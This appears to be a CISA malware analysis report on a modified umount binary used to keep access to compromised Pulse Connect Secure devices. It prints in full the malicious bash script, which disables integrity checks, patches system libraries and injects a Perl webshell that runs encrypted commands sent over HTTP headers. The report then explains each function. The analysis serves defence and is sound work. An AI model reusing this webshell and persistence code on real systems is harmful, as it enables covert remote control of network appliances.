Summary Description CISA received four files for analysis. One of the files is a modified version of the Unix umount application. It is designed to "hook" the umount functionality of a compromised Unix device. The added functionality provided via this umount "hook" makes several system modifications which provides a remote operator persistent command and control (C2) access to a compromised Pulse Secure device. The remaining files are modified by the umount "hook." This analysis is derived from malicious files found on Pulse Connect Secure devices.

The modified umount application contains a bash script with an appended ELF binary. When the system attempts to perform an unmount to disconnect a device, the "main" portion of this script will perform several system modifications to the Pulse Secure device before extracting the appended ELF binary, writing it to disk, marking it executable, and using it to actually perform the umount task. This application acts as a "hook" to the compromised device's unmount task. The system modifications performed during this "hook" are ultimately designed to provide a hacker remote C2 capabilities over a compromised Pulse Secure device. The full malicious script contained within this application is illustrated below. After this full illustration is a summary explanation of the primary pieces of this full malicious script. --Begin Full Malicious Script-- ##sstart #!/bin/bash normal_um() { /bin/cp /bin/umount /bin/umount_re /bin/sed -i '/\#\#sstart/,/\#\#eend/d' /bin/umount_re /bin/sed -i '1d' /bin/umount_re /bin/sed -i 's/^#//' /bin/umount_re /bin/chmod u+x /bin/umount_re /bin/umount_re $* /bin/rm -f /bin/umount_re /bin/mount -o remount,ro /dev/root / >/dev/null 2>&1 } patch_manifest() { file="/tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi" OPENSSL="/tmp/data/root/home/bin/openssl" h=`$OPENSSL dgst -sha256 $file 2>/dev/null | sed -e 's/^[^ ]*= //'` bkh="/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi "$h" b" ori=`sed -n "/sdp_mobile_login.cgi/=" /tmp/data/root/home/etc/manifest/manifest` if [ -n "$ori" ]; then /bin/sed -i "$ori"a\\"$bkh" /tmp/data/root/home/etc/manifest/manifest /bin/sed -i "$ori"d /tmp/data/root/home/etc/manifest/manifest fi sed -i '/verify 1/d' /tmp/data/root/home/bin/check_integrity.sh sed -i '/err Signature/d' /tmp/data/root/home/bin/check_integrity.sh } patch_cgi() { /bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/w tmp1' /bin/umount /bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/w tmp2' /bin/umount /bin/sed -i '/^use DSSessionParams/r tmp1' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/^sub main/r tmp2' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgi/d' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/rm -f tmp1 /bin/rm -f tmp2 } patch_libdsp() { /bin/sed -i 's/ForceCommand/#orceCommand/g' /tmp/data/root/home/lib/libdsplibs.so /bin/sed -i '/local line c file sha m/,/exit 1/s/verifyFiles//g' /tmp/data/root/home/bin/check_integrity.sh } patch_umount() { /bin/sed -i '/\#\#sstart/,/\#\#eend/w /tmp/data/root/bin/xx' /bin/umount /bin/sed -i 's/^/#/' /tmp/data/root/bin/umount /bin/sed -i '1i \ ' /tmp/data/root/bin/umount /bin/sed -i '1r /tmp/data/root/bin/xx' /tmp/data/root/bin/umount /bin/touch /tmp/data/root/bin/umount -r /tmp/data/root/bin/cp /bin/rm -f /tmp/data/root/bin/xx } waitweb() { trap '' HUP >/dev/null 2>&1 st=1 while [ $st -lt 2 ] ; do ps -fA|grep /home/bin/web |grep -v grep > /dev/null if [ $? -eq 0 ]; then sleep 3 /bin/mount -o remount,rw /dev/root / >/dev/null 2>&1 st=2 /bin/mount -o remount,ro /dev/root / > /dev/null 2>&1 else sleep 2 fi done } /bin/mount -o remount,rw /dev/root / >/dev/null 2>&1 if [ $# == 2 ] && [ $1 == "-r" ] && [ $2 == "/tmp/data/root" ] ; then patch_cgi patch_manifest patch_umount patch_libdsp normal_um $* else normal_um $* fi ###cgistart1 #use Crypt::RC4; #use MIME::Base64 (); ###cgiend1 ###cgistart2 #my $request_method=$ENV{'REQUEST_METHOD'}; #if ($request_method eq "POST") { #    my $x_key = $ENV{'HTTP_X_KEY'}; #    if ($x_key eq "zzdibweoQxffnDEi2UKacJlEekplJ7uwrt") { #        my $x_cmd = $ENV{'HTTP_X_CMD'}; #        my $x_cnt = $ENV{'HTTP_X_CNT'}; #        $x_cmd = MIME::Base64::decode($x_cmd); #        $x_cmd = RC4($x_cnt, $x_cmd); #        my $res; #        my $re=popen(*DUMP, $x_cmd, "r"); #        while(<DUMP>){ #            $res .= $_; #        } #        close(*DUMP); #        print "Content-type:text/html\n\n"; #        print MIME::Base64::encode(RC4($x_cnt, $res)); #        exit(0); #    } #    else { #        exit(0); #    } #} ###cgiend2 ##eend --End Full Malicious Script-- The function illustrated below is designed to make a small modification to the Pulse Secure system file named libdsplibs.so. This function will change all occurrences of the string "ForceCommand" in the libdsplibs.so binary to the string "#orceCommand". The function below will also remove the string "verifyFiles" from the Pulse Secure system file named check_integrity.sh. --Begin libdsplibs.so Modification Function-- patch_libdsp() { /bin/sed -i 's/ForceCommand/#orceCommand/g' /tmp/data/root/home/lib/libdsplibs.so /bin/sed -i '/local line c file sha m/,/exit 1/s/verifyFiles//g' /tmp/data/root/home/bin/check_integrity.sh } --End libdsplibs.so Modification Function-- The function illustrated below is designed to modify the Pulse Secure system files named manifest and check_integrity.sh. As illustrated, this function hashes the new version of the script named sdp_mobile_login.cgi, which now contains a patched in webshell. The function then counts the number of times the string "sdp_mobile_login.cgi" is found in the Pulse Secure manifest file. The malware then replaces this "sdp_mobile_login.cgi" string with the full path of the patched version, and its corresponding SHA256 value within the manifest file. The replacement string for the current "sdp_mobile_login.cgi" strings will appear similar to the following: "/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi 6092a24ca3853fb351989ee1aa2eca604fc438afc1e64df3ede10ffda577d475 b". The function then removes the strings "verify 1" and "err Signature" from the Pulse Secure system file check_integrity.sh. It appears the modifications may be required for the Pulse Secure system to allow the execution of the hacker-modified version of sdp_mobile_login.cgi. Note: The comments in the code below were added by CISA to clarify the functionality of different parts of the malicious code. --Begin manifest and check_integrity.sh Modification Function-- patch_manifest() { file="/tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi” //*CISA: Assign full path to variable file OPENSSL="/tmp/data/root/home/bin/openssl". h=`$OPENSSL dgst -sha256 $file 2>/dev/null | sed -e 's/^[^ ]*= //‘` //*CISA: SHA256 hash file. bkh="/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi "$h" b"         //*CISA: Build variable containing full file name and SHA256. ori=`sed -n "/sdp_mobile_login.cgi/=" /tmp/data/root/home/etc/manifest/manifest` //*CISA: Count number of sdp_mobile_login.cgi occurrences. if [ -n "$ori" ]; then /bin/sed -i "$ori"a\\"$bkh" /tmp/data/root/home/etc/manifest/manifest //*CISA: Replace with full path of hacked sdp_mobile_login.cgi file with hash value. /bin/sed -i "$ori"d /tmp/data/root/home/etc/manifest/manifest fi sed -i '/verify 1/d' /tmp/data/root/home/bin/check_integrity.sh //*CISA: Remove "verify 1" string from file. sed -i '/err Signature/d' /tmp/data/root/home/bin/check_integrity.sh //*CISA: Remove "err Signature" string from file. } --End manifest and check_integrity.sh Modification Function-- The script modifies the Pulse Secure system file named sdp_mobile_login.cgi by adding data to it from a file contained on disk named tmp2. The code utilized to modify sdb_mobile_login.cgi is illustrated below. Analysis of the modified sdb_mobile_login.cgi indicates this modification adds a webshell to the Pulse Secure applications which allows an operator to remotely issue commands to a compromised device. This patched-in webshell is detailed within the description of the file sdp_mobile_login.cgi, included within this document. Notably, the function below also modifies the /bin/umount application by adding data to it contained in the files tmp1 and tmp2. After the modifications of umount and sdp_mobile_login.cgi, the function deletes the files tmp1 and tmp2. The original files tmp1 and tmp2 were not available for analysis. --Begin sdb_mobile_login.cgi and umount Modification Code (Using tmp1 and tmp2)-- patch_cgi() { /bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/w tmp1' /bin/umount /bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/w tmp2' /bin/umount /bin/sed -i '/^use DSSessionParams/r tmp1' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/^sub main/r tmp2' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/sed -i '/\#\#cgi/d' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi /bin/rm -f tmp1 /bin/rm -f tmp2 } --End sdb_mobile_login.cgi and umount Modification Code (Using tmp1 and tmp2)-- The malicious function illustrated below is designed to extract the ELF binary from the current (hacker modified) umount application, and run it as a standalone application to actually perform the umount function for the operating system. The function extracts the embedded ELF, writes it out to disk as /bin/umount_re, and sets it to executable via the system command /bin/chmod u+x /bin/umount_re. The function then executes the umount_re application and deletes it from disk. The final command in the function mounts /dev/root as read only. The remounting of /dev/root with read only permissions is likely a method to hide this activity from a system administrator, as it may draw the attention of system analysts that /dev/root is mounted with read and write permissions. --Begin normal_um() Function-- normal_um() { /bin/cp /bin/umount /bin/umount_re /bin/sed -i '/\#\#sstart/,/\#\#eend/d' /bin/umount_re /bin/sed -i '1d' /bin/umount_re /bin/sed -i 's/^#//' /bin/umount_re /bin/chmod u+x /bin/umount_re /bin/umount_re $* /bin/rm -f /bin/umount_re /bin/mount -o remount,ro /dev/root / >/dev/null 2>&1 } --End normal_um() Function-- The function below modifies the system application /bin/umount using the data contained in a file named /tmp/data/root/bin/xx.

The modification made to the script is illustrated below. It is believed the modification to this Pulse Secure script was made by the application named umount detailed within this document. The main function of this application has been hooked to check for the following incoming POST parameters: HTTP_X_KEY, HTTP_X_CMD, HTTP_X_CNT. The data passed in with the HTTP_X_CMD parameter will be base64 decoded and RC4 decrypted using the key data passed in via the HTTP_X_CNT parameter. The now decrypted HTTP_X_CMD parameter data will then be executed on the target system using the popen() function and the command's return value will be RC4 encrypted -- using the RC4 key passed via the HTTP_X_CNT parameter -- and base64 encoded before being returned to the remote operator via the web application using a print statement.

Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts. Maintain up-to-date antivirus signatures and engines. Keep operating system patches up-to-date. Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. Enforce a strong password policy and implement regular password changes. Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known. Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. Disable unnecessary services on agency workstations and servers. Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header). Monitor users' web browsing habits; restrict access to sites with unfavorable content. Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). Scan all software downloaded from the Internet prior to executing. Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
